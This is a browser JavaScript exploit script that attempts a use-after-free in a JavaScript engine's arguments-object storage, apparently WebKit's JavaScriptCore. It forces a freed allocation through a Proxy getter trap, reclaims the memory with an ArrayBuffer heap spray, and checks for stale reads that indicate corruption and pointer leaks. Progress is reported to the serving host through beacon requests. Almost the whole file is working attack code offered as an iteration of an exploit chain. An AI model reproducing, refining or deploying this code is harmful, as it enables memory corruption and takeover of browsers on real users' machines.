// p240 — ClonedArguments butterfly UAF via PreciseAllocation realloc
//
// Improvement over p220: use 1024+ arguments so butterfly > 8KB
// → allocated as PreciseAllocation → reallocArrayRightIfPossible
// calls reallocatePreciseAllocationNonVirtual → REAL free of old memory
// → spray can reclaim the freed slot
//
// Beacon prefix: V240-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var queue = [];
  var sending = false;

  function B(tag, body) {
    queue.push({tag: tag, body: body || ''});
    if (!sending) drain();
  }

  function drain() {
    if (queue.length === 0) { sending = false; return; }
    sending = true;
    var item = queue.shift();
    try {
      var x = new XMLHttpRequest();
      if (item.body) {
        x.open('POST', BASE + '/beacon/V240-' + item.tag + '?t=' + Date.now(), true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(item.body);
      } else {
        x.open('GET', BASE + '/beacon/V240-' + item.tag + '?t=' + Date.now(), true);
        x.send();
      }
      x.onloadend = function() { setTimeout(drain, 10); };
      x.onerror = function() { setTimeout(drain, 10); };
    } catch(e) { setTimeout(drain, 10); }
  }

  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  // Create target function (sloppy mode)
  function target() { return arguments; }

  function receiver() {
    return Array.prototype.slice.call(arguments);
  }

  // ---- Phase 1: Verify 1024-arg butterfly is PreciseAllocation ----
  // Create 1024 arguments — butterfly = 8 + 1024*8 = 8200 bytes
  // MarkedBlock largeCutoff ~8032 bytes, so this exceeds it
  var ARG_COUNT = 1100;

  var manyArgs = [];
  for (var a = 0; a < ARG_COUNT; a++) manyArgs.push(a + 1);

  try {
    var testArgs = target.apply(null, manyArgs);
    B('ARGS-OK-' + testArgs.length);

    // Verify copyToArguments works
    var testResult = receiver.apply(null, testArgs);
    B('COPY-OK-' + testResult.length);
    B('VAL0-' + testResult[0] + '-VAL1023-' + testResult[1023]);
  } catch(e) {
    B('BASIC-ERR-' + e.message.substring(0, 40));
  }

  // ---- Phase 2: Hole + Proxy trigger with PreciseAllocation ----
  try {
    var args = target.apply(null, manyArgs);
    B('ARGS2-' + args.length);

    // Create hole at index 500 (middle of butterfly)
    delete args[500];
    B('HOLE-500');

    var trapFired = 0;
    var sprayBufs = [];
    var sprayViews = [];
    var SPRAY_SIZE = 8192;
    var SPRAY_N = 500;

    var handler = {
      get: function(t, prop, rcv) {
        trapFired++;
        if (trapFired > 1) return 0xDEAD0000 | trapFired;

        B('TRAP-FIRE-P' + prop);

        // Step 1: Grow arguments to force butterfly reallocation
        // Old butterfly: ~8200 bytes (PreciseAllocation)
        // New butterfly: ~32000+ bytes (also PreciseAllocation)
        // realloc should MOVE the allocation → old memory freed
        for (var j = ARG_COUNT; j < 4000; j++) {
          args[j] = 0x41414141;
        }
        B('TRAP-GREW-4000');

        // Step 2: Flush deallocation log
        // Allocate many small objects to push entries through bmalloc dealloc log
        var flushJunk = [];
        for (var f = 0; f < 200; f++) flushJunk.push(new ArrayBuffer(64));
        for (var f = 0; f < 200; f++) flushJunk[f] = null;
        flushJunk = null;
        B('TRAP-FLUSHED');

        // Step 3: Spray to reclaim old butterfly memory (~8200 bytes)
        // Use ArrayBuffers of matching size
        for (var s = 0; s < SPRAY_N; s++) {
          var ab = new ArrayBuffer(SPRAY_SIZE);
          var view = new Uint32Array(ab);
          // Fill with recognizable pattern
          // Pattern: 0xCAFE0000 | spray_index in each uint32
          for (var k = 0; k < view.length; k++) {
            view[k] = (0xCAFE0000 | (s & 0xFFFF)) >>> 0;
          }
          sprayBufs.push(ab);
          sprayViews.push(view);
        }
        B('TRAP-SPRAY-' + SPRAY_N);

        return 0xBEEF0001;
      }
    };

    var proxy = new Proxy({}, handler);
    Object.setPrototypeOf(args, proxy);
    B('PROTO-SET');

    // Trigger: receiver.apply → loadVarargs → copyToArguments
    // copyToArguments caches butterfly data pointer
    // Hits hole at 500 → get() → Proxy trap → butterfly freed → spray reclaims
    // Loop resumes at index 501+ with stale pointer → reads spray data
    var result;
    try {
      result = receiver.apply(null, args);
    } catch(e) {
      B('APPLY-ERR-' + e.message.substring(0, 40));
    }

    if (result) {
      B('RESULT-LEN-' + result.length);
      B('TRAP-FIRED-' + trapFired);

      // Check indices around the hole (500) and after
      // Before hole: should be original values
      // At hole (500): should be 0xBEEF0001 (proxy return)
      // After hole (501+): if UAF succeeded, should be 0xCAFExxxx pattern

      var vals = '';
      var corruptCount = 0;
      // Check indices 498-510
      for (var r = 498; r < Math.min(512, result.length); r++) {
        var v = result[r];
        var u;
        if (typeof v === 'number') {
          u = v >>> 0;
          vals += r + '=' + hex(u) + ' ';
          // Check for spray pattern (0xCAFExxxx)
          if ((u >>> 16) === 0xCAFE) {
            corruptCount++;
          }
        } else if (v === undefined) {
          vals += r + '=undef ';
        } else {
          vals += r + '=' + typeof v + ' ';
        }
      }
      B('VALS', vals);
      B('CORRUPT-' + corruptCount);

      // Also check a wide range for any spray pattern
      var wideCorrupt = 0;
      var wideVals = '';
      for (var r = 501; r < Math.min(result.length, 1050); r += 10) {
        var v = result[r];
        if (typeof v === 'number') {
          var u = v >>> 0;
          if ((u >>> 16) === 0xCAFE) {
            wideCorrupt++;
            if (wideCorrupt <= 5) wideVals += r + '=' + hex(u) + ' ';
          }
        }
      }
      B('WIDE-CORRUPT-' + wideCorrupt, wideVals);

      if (corruptCount > 0 || wideCorrupt > 0) {
        B('UAF-CONFIRMED');

        // Leak pointers: read the spray view that overlaps old butterfly
        // The stale pointer reads into one of our spray ArrayBuffers
        // If we write to result[501] (through the stale pointer), it
        // writes into our ArrayBuffer → we can detect which one
        //
        // First identify which spray buffer got the hit
        for (var s = 0; s < sprayViews.length; s++) {
          var view = sprayViews[s];
          var changed = false;
          for (var k = 0; k < view.length; k++) {
            if (view[k] !== ((0xCAFE0000 | (s & 0xFFFF)) >>> 0)) {
              changed = true;
              B('SPRAY-HIT-' + s + '-OFF' + (k*4) + '-VAL' + hex(view[k]));
              break;
            }
          }
          if (changed) break;
        }
      } else {
        B('NO-CORRUPT-REALLOC-INPLACE');

        // Fallback: check if ANY values differ from expected
        var anyDiff = 0;
        for (var r = 501; r < Math.min(result.length, 600); r++) {
          var v = result[r];
          var expected = r + 1;
          if (typeof v === 'number' && (v >>> 0) !== expected) {
            anyDiff++;
            if (anyDiff <= 5) B('DIFF-' + r + '-GOT' + hex(v >>> 0) + '-EXP' + hex(expected));
          }
        }
        B('DIFFS-' + anyDiff);
      }
    }
  } catch(e) {
    B('MAIN-ERR-' + e.message.substring(0, 60));
  }

  // ---- Phase 3: Alternative — even larger butterfly ----
  setTimeout(function() {
    try {
      B('ALT-START');
      var ARG2 = 2048;
      var args2 = [];
      for (var a = 0; a < ARG2; a++) args2.push(a + 1);
      var bigArgs = target.apply(null, args2);
      B('ALT-ARGS-' + bigArgs.length);

      // Multiple holes for more trigger chances
      delete bigArgs[800];
      delete bigArgs[1200];
      delete bigArgs[1600];

      var altTrapCount = 0;
      var altSpray = [];

      var altHandler = {
        get: function(t, prop) {
          altTrapCount++;
          if (altTrapCount > 1) return 0xFACE0000 | altTrapCount;

          B('ALT-TRAP-' + prop);

          // Grow massively
          for (var j = ARG2; j < 8000; j++) bigArgs[j] = 0x42424242;
          B('ALT-GREW-8000');

          // Heavy flush + spray
          for (var f = 0; f < 500; f++) new ArrayBuffer(128);
          for (var s = 0; s < 300; s++) {
            var ab = new ArrayBuffer(16384);
            var v = new Uint32Array(ab);
            for (var k = 0; k < v.length; k++) v[k] = (0xDEAD0000 | s) >>> 0;
            altSpray.push(ab);
          }
          B('ALT-SPRAY-300');

          return 0xFACE0001;
        }
      };

      Object.setPrototypeOf(bigArgs, new Proxy({}, altHandler));

      var altResult = receiver.apply(null, bigArgs);
      B('ALT-RESULT-' + altResult.length);

      // Check for spray pattern
      var altCorrupt = 0;
      var altVals = '';
      for (var r = 801; r < Math.min(altResult.length, 1300); r += 5) {
        var v = altResult[r];
        if (typeof v === 'number' && ((v >>> 0) >>> 16) === 0xDEAD) {
          altCorrupt++;
          if (altCorrupt <= 5) altVals += r + '=' + hex(v >>> 0) + ' ';
        }
      }
      B('ALT-CORRUPT-' + altCorrupt, altVals);
    } catch(e) {
      B('ALT-ERR-' + e.message.substring(0, 60));
    }

    B('DONE');
  }, 500);
})();
